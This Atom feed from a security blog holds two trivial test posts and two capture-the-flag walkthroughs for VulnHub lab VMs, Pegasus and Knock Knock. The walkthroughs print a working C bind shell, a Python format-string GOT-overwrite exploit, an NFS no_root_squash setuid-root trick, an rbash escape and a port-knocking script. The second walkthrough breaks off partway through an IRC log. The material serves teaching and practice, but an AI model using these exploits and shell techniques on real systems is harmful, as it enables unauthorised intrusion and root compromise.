<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[FourFourFourFour]]></title>
  <link href="http://recrudesce.github.io/atom.xml" rel="self"/>
  <link href="http://recrudesce.github.io/"/>
  <updated>2015-01-01T23:59:35+00:00</updated>
  <id>http://recrudesce.github.io/</id>
  <author>
    <name><![CDATA[recrudesce]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Tester Page Number 2]]></title>
    <link href="http://recrudesce.github.io/blog/2015/01/01/tester-page-number-2/"/>
    <updated>2015-01-01T23:22:54+00:00</updated>
    <id>http://recrudesce.github.io/blog/2015/01/01/tester-page-number-2</id>
    <content type="html"><![CDATA[<figure class='code'><figcaption><span>Discover if a number is prime</span><a href='http://www.noulakaz.net/weblog/2007/03/18/a-regular-expression-to-check-for-prime-numbers/'>Source Article</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">class</span> <span class="nc">Fixnum</span>
</span><span class='line'>  <span class="k">def</span> <span class="nf">prime?</span>
</span><span class='line'>    <span class="p">(</span><span class="s1">&#39;1&#39;</span> <span class="o">*</span> <span class="nb">self</span><span class="p">)</span> <span class="o">!~</span> <span class="sr">/^1?$|^(11+?)\1+$/</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tester Page]]></title>
    <link href="http://recrudesce.github.io/blog/2015/01/01/tester-page/"/>
    <updated>2015-01-01T23:19:10+00:00</updated>
    <id>http://recrudesce.github.io/blog/2015/01/01/tester-page</id>
    <content type="html"><![CDATA[<p>Wow, much test</p>

<!-- more -->


<p>Such blog.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Because she was a princess she had a Pegasus.]]></title>
    <link href="http://recrudesce.github.io/blog/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/"/>
    <updated>2014-12-19T13:50:49+00:00</updated>
    <id>http://recrudesce.github.io/blog/2014/12/19/because-she-was-a-princess-she-had-a-pegasus</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/theknapsy">Knapsy</a> (<a href="https://knapsy.github.io/">blog</a>) released <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> - to be honest I was supposed to beta test it, but I kinda didn&rsquo;t get a chance to. However, it allowed me to experience the VM at the same time as everyone else.</p>

<p>People generally work alone on VM&rsquo;s, so to mix it up a bit, I decided to team up with <a href="https://twitter.com/barrebas">barrebas</a> (<a href="https://barrebas.github.io/">blog</a>) and own the VM as a collaboration :)</p>

<p>So, here&rsquo;s a quick walkthrough on how to root Pegasus, written by both barrebas and myself.</p>

<!-- more -->


<h1>Getting a Foot(hoof?)hold</h1>

<p><img src="http://awesomelytechie.com/wp-content/uploads/2013/08/Lets-get-down-to-business.gif" alt="" /></p>

<p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@kali:~# nmap -sS -p- -T5 172.16.231.132</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-19 13:31 GMT
Nmap scan report for 172.16.231.132
Host is up (0.000063s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
8088/tcp  open  radan-http</p>

<p>MAC Address: 00:0C:29:E3:2A:04 (VMware)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
root@kali:~#
[/plain]</p>

<p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png" alt="pegasus_001" /></a></p>

<p>Time to brute force some directories/files. Experience has shown me that vulnerable VM creators are sneaky gits, so I opted to use a large dictionary here, just to see what it came up with. Because of this large dictionary, I had to use dirbuster instead of dirb, because dirb takes ages to parse large dictionary files. Prepare for some horrible UI screenshots&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png" alt="pegasus_002" /></a></p>

<p>I&rsquo;m only interested in the files that returned HTTP 200, as these actually exist, so submit.php and codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png" alt="pegasus_003" /></a></p>

<p>codereview.php POSTS to submit.php, so for the moment I can ignore submit.php and focus on codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png" alt="pegasus_004" /></a></p>

<p><img src="http://i527.photobucket.com/albums/cc352/gabzylovescrack/HTTYD/Shudder.gif" alt="" /></p>

<p>Mike is a code reviewer, and a trainee&hellip; therefore is pretty inexperienced. After a bit of time throwing various languages at the application, I found out that if you provide C sourcecode, it gets compiled and executed. Nice ! Lets bash some shellcode in there - specifically a bind shell and submit it.</p>

<p>[c]#include &lt;sys/socket.h></p>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;netinet/in.h></h1>

<p>int main(void)
{
        int clientfd, sockfd;
        int dstport = 4444;
        int o = 1;
        struct sockaddr_in mysockaddr;</p>

<pre><code>    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    //setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;o, sizeof(o)); //a luxury we don't have space for

    mysockaddr.sin_family = AF_INET; //2
    mysockaddr.sin_port = htons(dstport);
    mysockaddr.sin_addr.s_addr = INADDR_ANY; //0

    bind(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(mysockaddr));

    listen(sockfd, 0);

    clientfd = accept(sockfd, NULL, NULL);

    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);

    execve("/bin/sh", NULL, NULL);
    return 0;
</code></pre>

<p>}[/c]</p>

<p>A quick NMAP scan confirms port 4444 has been opened.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@kali:~# nmap -sS -p4444 -T5 172.16.231.132</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-19 13:47 GMT
Nmap scan report for 172.16.231.132
Host is up (0.00040s latency).
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 00:0C:29:E3:2A:04 (VMware)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
root@kali:~#
[/plain]</p>

<p>A quick connection to the port via Netcat and a bit of Python allow us to get a TTY enabled shell.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@kali:~# nc -nv 172.16.231.132 4444
(UNKNOWN) [172.16.231.132] 4444 (?) open
python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
mike@pegasus:/home/mike$ id
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
mike@pegasus:/home/mike$
[/plain]</p>

<p>Now over to barrebas for the next step ! <em>fancy screen wipe animation</em></p>

<hr />

<p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
mike@pegasus:~$ ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit
[/plain]</p>

<p>The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Selection: 1</p>

<p>Enter first number: 5
Enter second number: AAAA
Error details: AAAA
[/plain]</p>

<p>That seemed promising. I entered:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Selection: 1</p>

<p>Enter first number: 5
Enter second number: %x
Error details: bff1039c
[/plain]</p>

<p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ldd my_first
    linux-gate.so.1 =>  (0x40022000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
    /lib/ld-linux.so.2 (0x40000000)
[/plain]</p>

<p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
080483b0 &lt;printf@plt>:
 80483b0:   ff 25 fc 9b 04 08       jmp    *0x8049bfc
 80483b6:   68 00 00 00 00          push   $0x0
 80483bb:   e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c>
[/plain]</p>

<p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Selection: 1</p>

<p>Enter first number: 5
Enter second number: AAAA%8$x
Error details: AAAA41414141
[/plain]</p>

<p>So I got working on an exploit. I quickly came up with this python script:</p>

<p>[python]</p>

<h1>!/usr/bin/python</h1>

<p>import struct</p>

<p>def p(x):
  return struct.pack(&ldquo;&lt;L&rdquo;, x)</p>

<p>payload = &ldquo;&rdquo;</p>

<h1>start calculator thingie</h1>

<p>payload += &ldquo;1\n5\n&rdquo;</p>

<h1>overwrite first part of got pointer</h1>

<p>payload += p(0x8049bfe)
payload += &ldquo;%16386c%8$hn&rdquo;</p>

<h1>overwrite second part of got pointer</h1>

<p>payload += p(0x8049bfc)
payload += &ldquo;%20566c%12$hn&rdquo;</p>

<p>payload += &ldquo;\n&rdquo;</p>

<h1>exit program</h1>

<p>payload += &ldquo;4\n&rdquo;
print payload
[/python]</p>

<p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>

<p>Then, it takes the 12th argument, which is the pointer to the second half of the got entry. It writes some dummy bytes and then the outputs the number of bytes written to the got address. Effectively, after running the exploit, the memory location at 0x8049bfc now contains 0x40069060. This is the address of system in libc after running the ulimit trick.</p>

<p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>

<p>[plain gutter=&ldquo;false&rdquo;]
mike@pegasus:~$ python exploit.py | ./my_first</p>

<p>&hellip;snip&hellip;</p>

<p>sh: 1: Selection:: not found</p>

<p>Goodbye!
[/plain]</p>

<p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>

<p>[plain gutter=&ldquo;false&rdquo;]
mike@pegasus:~$ ln -s /bin/dash Selection:
mike@pegasus:~$ export PATH=&ldquo;.:$PATH&rdquo;
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ (python ./exploit.py; cat) | ./my_first</p>

<p>&hellip;snip&hellip;</p>

<p>id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
[/plain]</p>

<p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 165, in spawn
    pid, master_fd = fork()
  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 107, in fork
    master_fd, slave_fd = openpty()
  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 29, in openpty
    master_fd, slave_name = <em>open_terminal()
  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 70, in </em>open_terminal
    raise os.error, &lsquo;out of pty devices&rsquo;
OSError: out of pty devices
[/plain]</p>

<p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>

<p>[c]</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<p>int main(int argc, char *argv[]){
setreuid(geteuid(), geteuid());
setregid(geteuid(), geteuid());</p>

<p>execv(&ldquo;/bin/dash&rdquo;, argv);
return 0;
}
[/c]</p>

<p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>

<p>[plain gutter=&ldquo;false&rdquo;]
/tmp/a.out
id
uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
john@pegasus:~$ sudo -l
sudo -l
Matching Defaults entries for john on this host:
    env_reset,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
[/plain]</p>

<p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
/opt/nfs    *(rw,sync,crossmnt,no_subtree_check,no_root_squash
[/plain]</p>

<p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>

<p>Over to recrudesce for the last bit of pwning pegasus!</p>

<hr />

<p>Before I continue, lets hear it for barrebas and his exploit dev skills.</p>

<p><img src="http://www.thepoke.co.uk/wp-content/uploads/2013/11/applause-3.gif" alt="" /></p>

<p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
root@kali:~# cd /mnt/nfs
root@kali:/mnt/nfs# ls -la
total 8
drwxr-xr-x 2 root root 4096 Nov 18 03:43 .
drwxr-xr-x 4 root root 4096 Dec 19 13:09 ..
[/plain]</p>

<p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>

<p>The code for the C wrapper is pretty straight forward</p>

<p>[c]
int main(void)
{
        system(&ldquo;/bin/dash&rdquo;);
}
[/c]</p>

<p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@kali:/mnt/nfs# gcc wrapper.c -m32
root@kali:/mnt/nfs# chmod 4777 a.out
[/plain]</p>

<p>Which, when executed as user john, drops me to a root shell</p>

<p>[plain gutter=&ldquo;false&rdquo;]
john@pegasus:/opt/nfs$ ls -la
ls -la
total 32
drwxr-xr-x 2 root root 4096 Dec 20 00:17 .
drwxr-xr-x 5 root root 4096 Nov 18 20:51 ..
-rwsrwxrwx 1 root root 7160 Dec 20 00:17 a.out
john@pegasus:/opt/nfs$ ./moo2
./a.out</p>

<h1>id</h1>

<p>uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
[/plain]</p>

<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>

<p>[plain gutter=&ldquo;false&rdquo;]</p>

<h1>cat flag</h1>

<p>cat flag
               ,
               |<code>\
              /'_/_
            ,'_/\_/\_                       ,
          ,'_/\'_\_,/_                    ,'|
        ,'_/\_'_ \_ \_/                _,-'_/
      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
    \_</code>> 6<code>7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
     ( ) \_ \|_ </code>_    _,/&lsquo;\,<em>&rsquo;</em>,/&lsquo;               a video game system sold in
      \<em>  __)    <code>\_                             Poland, Serbia and Bosnia.
       \_)   &gt;       </code>_                           It was a hardware clone of
            /  <code>,      |</code>_                         the Nintendo Famicom.
           /    \     / \ <code>\
          /   __/|   /  / </code>\
         (<code> (   (</code> (</em>  \   /
         /  ,/    |  /  /   \
        / ,/      | /   \   `_
      <em>/</em>/        |/    /<em><em>/,</em>/
     /</em>(         /_(</p>

<p>CONGRATULATIONS! You made it :)</p>

<p>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)</p>

<p>Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.</p>

<p>Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!</p>

<p>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
[/plain]</p>

<p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Knock Knock... Who's There ?]]></title>
    <link href="http://recrudesce.github.io/blog/2014/10/26/knock-knock-whos-there/"/>
    <updated>2014-10-26T18:42:03+00:00</updated>
    <id>http://recrudesce.github.io/blog/2014/10/26/knock-knock-whos-there</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/zer0w1re">zer0w1re</a> released his first VM, <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a>, so I downloaded it and had a go (truth be told, I tested it before the public release, but this writeup is for the version available on Vulnhub.)</p>

<!-- more -->


<p><img src="http://www.quickmeme.com/img/24/24feb14fa531ddb2c9fbe31c1607f6b71e1dd30c6b5820790e8110da7f8f8d3e.jpg" alt="" /></p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nmap -sS -T5 -p- -O &ndash;script banner 172.16.56.139</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-23 18:55 BST
Nmap scan report for 172.16.56.139
Host is up (0.00044s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
1337/tcp open  waste
|_banner: [57154, 48662, 9528]
MAC Address: 00:0C:29:DE:8D:33 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 3.2, Linux 3.2 - 3.10
Network Distance: 1 hop</p>

<p>OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 94.00 seconds
root@pwk:~# [/plain]</p>

<p>Connecting to port 1337 results in 3 numbers.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nc 172.16.56.139 1337
[56861, 38987, 45887]
root@pwk:~# [/plain]</p>

<p>I guess I&rsquo;m knocking some ports then.
NB: in the test version, these 3 ports were in order, in the release version they&rsquo;re randomised. So rather than knocking them in the order returned, we&rsquo;re going to have to write a python script to do all possible port orders. The fun thing here is we don&rsquo;t need to check anything after each knock attempt - we just knock the port numbers in all possible combinations and then check afterwards for any new ports.</p>

<p>I couldn&rsquo;t be bothered to write my own script, so I stole <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">Leonjza&rsquo;s</a>, as I was talking to him about it at the time</p>

<p>[python]</p>

<h1>!/usr/bin/python</h1>

<p>import socket
import itertools
import sys</p>

<p>destination = &ldquo;192.168.56.203&rdquo;</p>

<p>def clean_up_ports(raw_string):
    &ldquo;&rdquo;&ldquo; Clean up the raw string received on the socket&rdquo;&ldquo;&rdquo;
    if len(raw_string) &lt;= 0:
        return None</p>

<pre><code># Remove the first [
raw_string = raw_string.replace('[','')
# Remove the second ]
raw_string = raw_string.replace(']','')
# split by commas
first_list = raw_string.split(',')

# start e empty return list
ports = []
for port in first_list:
    # strip the whitespace around the string
    # and cast to a integer
    ports.append(int(port.strip()))

return  ports
</code></pre>

<p>def main():
    print &ldquo;[+] Getting sequence&rdquo;</p>

<pre><code>try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((destination, 1337))
except Exception as e:
    print "[+] Unable to connect to %s on port 1337. %s" % (destination, e)
    sys.exit(1)

# receive the list
raw_list = sock.recv(20)

# get the ports in a actual python list
ports = clean_up_ports(raw_list)

print "[+] Sequence is %s" % ports
print "[+] Knocking on the door using all the possible combinations...\n"

# Lets knock all of the possible combinations of the ports list
for port_list in itertools.permutations(ports):

    print "[+] Knocking with sequence: %s" % (port_list,)
    for port in port_list:
        print "[+] Knocking on port %s:%s" % (destination,port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        sock.connect_ex((destination, port))
        sock.close()

    print "[+] Finished sequence knock\n"
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:
    print &ldquo;[+] Knock knock opener&rdquo;
    main()
    print &ldquo;[+] Done&rdquo;
[/python]</p>

<p>He&rsquo;s a clever one :P</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# python knock.py
[+] Knock knock opener
[+] Getting sequence
[+] Sequence is [37430, 5311, 17504]
[+] Knocking on the door using all the possible combinations&hellip;</p>

<p>[+] Knocking with sequence: (37430, 5311, 17504)
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:17504
[+] Finished sequence knock</p>

<p>[+] Knocking with sequence: (37430, 17504, 5311)
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:5311
[+] Finished sequence knock</p>

<p>[+] Knocking with sequence: (5311, 37430, 17504)
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:17504
[+] Finished sequence knock</p>

<p>[+] Knocking with sequence: (5311, 17504, 37430)
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:37430
[+] Finished sequence knock</p>

<p>[+] Knocking with sequence: (17504, 37430, 5311)
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:5311
[+] Finished sequence knock</p>

<p>[+] Knocking with sequence: (17504, 5311, 37430)
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:37430
[+] Finished sequence knock</p>

<p>[+] Done
root@pwk:~#[/plain]</p>

<p>Now another NMAP is required to see what opened (if anything)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~/# nmap -sS -T5 &ndash;script banner 172.16.56.139</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-23 19:14 BST
Nmap scan report for 172.16.56.139
Host is up (0.00025s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp open  http
MAC Address: 00:0C:29:DE:8D:33 (VMware)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 25.87 seconds
root@pwk:~/#
[/plain]</p>

<p>The HTTP server is hosting a simple page, which displays an image of a door, and text asking us to look deeper.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png" alt="knockknock_001" /></a></p>

<p>Now, if that&rsquo;s not an invitation to look inside the JPG, then I don&rsquo;t know what is.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# wget <a href="http://172.16.56.139/knockknock.jpg">http://172.16.56.139/knockknock.jpg</a>
&ndash;2014-10-23 19:17:39&ndash;  <a href="http://172.16.56.139/knockknock.jpg">http://172.16.56.139/knockknock.jpg</a>
Connecting to 172.16.56.139:80&hellip; connected.
HTTP request sent, awaiting response&hellip; 200 OK
Length: 84741 (83K) [image/jpeg]
Saving to: `knockknock.jpg&#8217;</p>

<p>100%[======================================================================================================================================================================================================>] 84,741      &ndash;.-K/s   in 0s</p>

<p>2014-10-23 19:17:39 (612 MB/s) - `knockknock.jpg&#8217; saved [84741/84741]</p>

<p>root@pwk:~# strings knockknock.jpg
JFIF
Ducky
<a href="http://ns.adobe.com/xap/1.0/">http://ns.adobe.com/xap/1.0/</a>
<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong> SNIP ! </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
qW|U
+\U
Login Credentials
abfnW
sax2Cw9Ow
root@pwk:~#
[/plain]</p>

<p>Ooh, some possible credentials. They look like ROT13, so&hellip;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# python rot13.py abfnW
nosaJ
root@pwk:~#
[/plain]</p>

<p>OK, that&rsquo;s just Jason reversed, so I guess the same deal for the password.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# python rot13.py sax2Cw9Ow | rev
jB9jP2knf
root@pwk:~#
[/plain]</p>

<p>These credentials can be used to SSH into the VM, which allows us to take a quick look around.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#106;&#x61;&#115;&#x6f;&#x6e;&#64;&#x31;&#x37;&#x32;&#x2e;&#49;&#54;&#46;&#x35;&#x36;&#x2e;&#49;&#x33;&#x39;">&#x6a;&#x61;&#x73;&#x6f;&#x6e;&#64;&#x31;&#x37;&#50;&#x2e;&#49;&#x36;&#46;&#53;&#x36;&#x2e;&#x31;&#51;&#57;</a>
<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#106;&#x61;&#115;&#x6f;&#110;&#x40;&#49;&#55;&#x32;&#46;&#49;&#54;&#x2e;&#53;&#x36;&#x2e;&#49;&#x33;&#x39;">&#x6a;&#97;&#115;&#x6f;&#x6e;&#x40;&#49;&#55;&#50;&#46;&#49;&#54;&#46;&#x35;&#x36;&#46;&#x31;&#51;&#57;</a>&rsquo;s password: jB9jP2knf
Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$ ls -l
total 8
-rwsr-xr-x 1 root jason 7457 Oct 11 18:35 tfc
jason@knockknock:~$
[/plain]</p>

<p>Looks like we&rsquo;re in a restricted bash shell, so lets escape that quickly</p>

<p>[plain gutter=&ldquo;false&rdquo;]
jason@knockknock:~$ ./tfc
-rbash: ./tfc: restricted: cannot specify `/&lsquo; in command names
jason@knockknock:~$ ftp
ftp> !
jason@knockknock:~$ ./tfc</p>

<hr />

<p>_<em>    </em><strong>/_   </strong><strong><em>/_   </em></strong> \
  |    |    |    <strong>)  /    \  \/
  |    |    |     \   \     _</strong><em>
  |</em><em><strong>|    _</strong>  /    _</em>____  /
                \/            \/</p>

<pre><code>Tiny File Crypter - 1.0
</code></pre>

<p>Usage: ./tfc &lt;filein.tfc> &lt;fileout.tfc>
jason@knockknock:~$ [/plain]</p>

<p>OK, so the next part is probably explained a lot better by reading some IRC logs.</p>

<p>[plain]
[2014-10-10T21:51:11+0100] <recrudesce> hey
[2014-10-10T21:51:18+0100] <recrudesce> so, xcrypt
[2014-10-10T21:51:36+0100] <c0ne> hey
[2014-10-10T21:52:09+0100] <recrudesce> i see that the encryption changes based on the length
[2014-10-10T21:52:28+0100] <recrudesce> so i figure you can send it an ascii string that actually creates a binary
[2014-10-10T21:52:33+0100] <recrudesce> but it wont be suid, so not possible to run it
[2014-10-10T21:53:23+0100] <c0ne> as in use tfc to make a file?
[2014-10-10T21:53:50+0100] <recrudesce> yeah
